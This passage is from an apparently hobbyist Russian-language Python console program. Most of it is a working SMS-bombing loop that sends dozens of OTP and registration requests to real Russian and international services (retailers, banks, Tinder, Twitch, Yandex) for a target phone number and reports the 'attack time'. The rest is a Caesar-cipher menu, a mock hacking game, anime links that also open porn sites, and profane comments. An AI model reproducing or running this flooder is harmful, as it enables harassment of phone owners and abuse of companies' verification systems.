						requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
						print('[+] Citilink отправлено!')

					try:
						requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
						print('[+] Smsint отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
						print('[+] oyorooms отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
						print('[+] MVideo отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
						print('[+] newnext отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
						print('[+] Sunlight отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
						print('[+] alpari отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
						print('[+] Invitro отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
						print('[+] Sberbank отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
						print('[+] Psbank отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
						print('[+] Beltelcom отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
						print('[+] Karusel отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
						print('[+] KFC отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
						print('[+] carsmile отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
						print('[+] Citilink отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
						print('[+] Delitime отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
						print('[+] findclone звонок отправлен!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
						print('[+] Guru отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
						print('[+] ICQ отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
						print('[+] InDriver отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
						print('[+] Invitro отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
						print('[+] Pmsm отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
						print('[+] IVI отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
						print('[+] Lenta отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
						print('[+] Mail.ru отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
						print('[+] MVideo отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
						print('[+] OK отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://plink.tech/register/',json={"phone": _phone})
						print('[+] Plink отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
						print('[+] qlean отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
						print('[+] SMSgorod отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
						print('[+] Tinder отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
						print('[+] Twitch отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
						print('[+] CabWiFi отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
						print('[+] wowworks отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
						print('[+] Eda.Yandex отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
						print('[+] Youla отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
						print('[+] Alpari отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
						print('[+] SMS отправлено!')
					except:
						print('[-] не отправлено!')

					try:
						requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
						print('[+] Delivery отправлено!')
					except:
						print('[-] Не отправлено!')



					try:
						iteration += 1
						print(('{} круг пройден.').format(iteration))
						print('время атаки {0} сек!'.format(round(time.monotonic() - start_time)))
					except:
						break


			elif Setting =='5':
				webbrowser.open_new_tab('https://music.yandex.ru/home')
				webbrowser.open_new_tab('https://vk.com/music_omega')
			elif Setting =='6':
				language = input('1)English\n2)Русский\n==> ')
				if language == '1':
					alphabet="abcdefghiklmnopqrstvxyzabcdefghiklmnopqrstvxyz"
				elif language == '2':
					alphabet ="абвгдеёжзийклмнопрстуфхцчшщъьэюяабвгдеёжзийклмнопрстуфхцчшщъьэюя"
				else:
					pass#duble comm, for shifr y, z and more.  

				print("______________________________________________")

				encrypt = input("Enter your clear message: ")
				key = int(input("Please enter key(number 1-25): "))
				encrypt = encrypt.lower() # lower - transform A (result a) and ...
				encrypted = ""

				# fuck you, вот хули ты тут забыл? - работает, не трогай.

				for letter in encrypt:
					position = alphabet.find(letter) # search all alpha , found() - search

					newPosit = position + key # к индексу прибавляем значение key , бля, да съеби ты отсюда.
					if letter in alphabet: # проверка символов
						encrypted =  encrypted + alphabet[newPosit] #новая буква
					else:
						encrypted = encrypted + letter #отсутствующая буква алфавита
				print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")		
				print(encrypted)
			elif Setting == '7':
				language = input('1)English\n2)Русский\n==> ')
				if language == '1':
					alphabet="abcdefghiklmnopqrstvxyzabcdefghiklmnopqrstvxyz"
				elif language == '2':
					alphabet ="абвгдеёжзийклмнопрстуфхцчшщъьэюяабвгдеёжзийклмнопрстуфхцчшщъьэюя"
				else:
					pass

				crypt = input('Enter crypt message: ')
				key = int(input('Please, enter key(number 1-25): '))
				crypt=crypt.lower()
				decoded = ""

				for letter in crypt:
					posytion = alphabet.find(letter)
					oldPosition = posytion - key
					if letter in alphabet:
						decoded = decoded +alphabet[oldPosition]
					else:
						decoded = decoded + letter
				print(decoded)
			elif Setting == '8':
				break
			else:
				pass
						
	elif a =='clear':
		os.system('cls')
	elif a == '.LinuxWM.exe' and WMware==154:
		i =1
		print(Fore.RED + "Open WMwareux Wsite_MASTERware Workstation Pro")
		if(os.path.exists('C:/male')):
			os.startfile('C:/Program Files (x86)/Vsite_MASTERware/Vsite_MASTERware Workstation/vmware.exe')
		else:
			os.mkdir('C:/male/')
			
	elif a == 'Cold_MAN':
		if Cold_MAN == 1:
			USER_ROS_IP = r'''192.168.204.1'''
			print(USER_ROS_IP)
		else:
			pass
	elif a == 'cd pakej' and Cold_MAN==1 and site_MASTER==5:
		Pakej = 2
		
	elif a == 'cd':
			if Pakej == 2:
				Pakej = 22
			else:
				print('We Haven\'t dir')
	elif a == 'info':
		print('Textic2')
		print('Новые возможности, новый интерфейс.')
		print('Начальный функционал')
		print('отличная оптимизация')
		print('малый размер Textic2')
		print(AVTORIZATION+'- пользователь Textic2 и просто хороший человек.')
		print('приятного пользования')
		print('для получения списка комманд "///comlist"')
	elif a == 'github':
		print('обработка, ждите...')
		time.sleep(2)
		print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
		print('дабы использовать скачивание: git clone [название программы]')
		print('1)LinuxWM.exe')
		print('2)Cold_MAN.git')
		print('3)anime.sh')


	elif a =="git clone Cold_MAN.git":
		Cold_MAN = 1
		print('Loading!')
		time.sleep(3)
		print('')
		print('get')
		time.sleep(2)
		os.system('cls')
		os.system('color 04')
		time.sleep(5)
		print('Cold_MAN нашёл подозрительную активность на вашем компьютере,\nдабы узнать IP подозреваемого, введите "Cold_MAN"')
	elif a == 'git clone anime.sh':

		ANIsite_MASTERE = 1
		time.sleep(3)
		print(time.asctime())
		print('get.')
		input('\a\a\n')
	elif a == './anime.sh':
		if ANIsite_MASTERE == 1:
			print(Fore.GREEN+'\a')
			print('Enter number [1-16]')
			print('For quit Enter "quit"')
			print('For visit next paje Enter "n"')
			title = input('==> ')
			ani = r''' Стандартная подборка '''
			m = r'''https://wallpaperscave.ru/images/original/17/12-17/technology-404-3741.jpg'''
			while True:

				if title == '1':
					m = r'''jut.su/kuzu-no-honkai/episode-1.html'''
					break
				elif title == '2':
					m=r'''https://jut.su/steins-gate/season-1/episode-1.html'''
					break
				elif title == '3':
					#1серию аниме спустя.
					m=r'''https://jut.su/no-game-no-life/episode-1.html'''
					break
				elif title == '4':
					m=r'''https://jut.su/fullmetal-alchemist/episode-1.html'''
					break
				elif title == '5':
					m=r'''https://jut.su/sword-art-online/season-1/episode-1.html'''
					break

				elif title == '6':
					m=r'''https://jut.su/one-punch-man/season-1/episode-1.html'''
					break

				elif title == '7':
					m=r'''https://jut.su/death-note/episode-1.html'''
					break

				elif title == '8':
					m=r'''https://jut.su/angel-beats/episode-1.html'''
					break
				elif title == '9':
					m=r'''https://jut.su/boku-no-hero-academia/season-1/episode-1.html'''
					break
				elif title == '10':
					m=r'''https://jut.su/noragami/season-1/episode-1.html'''
					break
				elif title == '11':
					m=r'''https://jut.su/blue-exorcist/season-1/episode-1.html'''
					break
				elif title == '12':
					m=r'''https://jut.su/akame-ga-kill/episode-1.html'''
					break
				elif title == '13':
					m=r'''https://jut.su/re-zero/episode-1.html'''
					break
				elif title =='14':
					m=r'''https://jut.su/konosuba/season-1/episode-1.html'''
					break
				elif title == '15':
					m=r'''https://jut.su/shokugeki-no-souma/season-1/episode-1.html'''
					break
				elif title == '16':
					m=r'''https://jut.su/ansatsu-kyoushitsu/season-1/episode-1.html'''
					break
				elif title == 'n':
					ani = r''' Особая подборка от 8-и Кагэ '''
					m=r'''https://vk.com/id577158514'''
					print('представленны только 3 аниме от каждого разработчика текстика')
					print(Fore.WHITE+'1-Мои(GexeM) последние просмотры')
					print(Fore.BLUE+'2-Мои(Mr Robot) последние просмотры')
					print(Fore.RED+'3-Мои(PinkPanter) последние просмотры')
					print(Fore.GREEN+'4-Мои(NoWayBack) последние просмотры')
					print(Fore.WHITE+'5-Мои(JA.MegaMaster.VA) послдние просмотры')
					print(Fore.BLUE+'6-Мои(FalconModel) последние просмотры')
					print(Fore.RED+'7-Наши(PIPOCHKA/OverLord) последние просмотры')
					print(Fore.GREEN+'')
					title2 = input('Enter Number: ')
					if title2 == '1':
						#vi kto talie? mi vas ne zvali, ebite naxoi
						print('Я больше по хентаю так что извините')
						webbrowser.open_new_tab('https://www.xvideos.com/tags/hentai')
						webbrowser.open_new_tab('https://www.pornhub.com/categories/hentai')
						webbrowser.open_new_tab('https://hentaiz.org')
						break
					elif title2 =='2':
						print(Fore.BLUE+'Пруятного, мурр :3')
						webbrowser.open_new_tab('https://animebest.org/anime/2066-kimi-ni-todoke.html')
						webbrowser.open_new_tab('https://animebest.org/anime/2814-isekai-maou-to-shoukan-shoujo-no-dorei-majutsu1.html')
						webbrowser.open_new_tab('https://animebest.org/anime/48-pomolvlena-s-neznakomcem-12-iz-12.html')
						break
					elif title2 =='3':
						print('Умри(не пиши так пантера, кто тебя блять-опять обидел?)')
						webbrowser.open_new_tab('https://jut.su/rikekoi/')
						webbrowser.open_new_tab('https://jut.su/sewayaki-kitsune/')
						webbrowser.open_new_tab('https://jut.su/overlord/')
						break
					elif title2 =='4':
						print(Fore.GREEN+'NoWayBack, Leader R_X Group')
						webbrowser.open_new_tab('https://jut.su/yahari-ore-no-seishun/')
						webbrowser.open_new_tab('https://jut.su/bleach/')
						webbrowser.open_new_tab('http://animevost.club/online/vtoraja_zhizn_v_drugom_mire_2019_1080_hd/17-1-0-930')
						break
					elif title2 =='5':
						print(Fore.ORANGE+'')
						webbrowser.open_new_tab('http://animevost.club/online/vtoraja_zhizn_v_drugom_mire_2019_1080_hd/17-1-0-930')
						webbrowser.open_new_tab('http://animevost.club/online/ne_ljublju_bol_poehtomu_sobirajus_vlozhit_vse_v_zashhitu_2020_1080_hd/10-1-0-2284')
						webbrowser.open_new_tab('https://animebest.org/anime/4451-boku-no-tonari-ni-ankoku-hakaishin-ga-imasu-ab1.html')
						break
					elif title2 =='6':
						webbrowser.open_new_tab('https://animebest.org/anime/4198-dr-stone-ab0b1.html')
						webbrowser.open_new_tab('https://animebest.org/anime/3086-tate-no-yuusha-no-nariagariab01q5.html')
						webbrowser.open_new_tab('https://animebest.org/anime/4412-shinchou-yuusha-kono-yuusha-ga-ore-tueee-kuse-ni-shinchou-sugiru-ab1q3.html')
						break
					elif title2 =='7':
						print('Ненавидим Аниме...')
						time.sleep(1)
						print('*хуяк по бошке этим двоим*')
						print('*Бумс*')
						print('Ладно-ладно, посмотрим мы ваше онэмэ...')
						time.sleep(2)
						print('cls')
						time.sleep(1)
						os.system('cls')
						print('ожидайте ещё пару секунд...')
						time.sleep(2)
						webbrowser.open_new_tab('https://animebest.org/anime/405-one-punch-man-ab01v.html')
						webbrowser.open_new_tab('https://animebest.org/anime/925-boruto-naruto-next-generationsab11q.html')
						webbrowser.open_new_tab('https://animebest.org/anime/4395-toaru-kagaku-no-accelerator-ab1.html')
						print('оказалось что онэмэ не такое и плохое, данную часть кода мы писали 2месяца\nт.к. мы оба плотно подсели на Наруто.')
						break
					else:
						print('WRITE NUMBER [1-7]')
						time.sleep(1)
						os.system('cls')
						ani = r'''  '''
						pass
					
				elif title == 'quit':
					ani = r''' quit '''
					break
				else:
					pass
					ani = r'''Отказанно в доступе'''
					print('Choose Number.')
					break
			print(ani)
			webbrowser.open_new_tab(m)
		else:
			pass
	elif a == 'shutdown':
		
		os.system('shutdown -s')
		break

	else:
		
		pass
	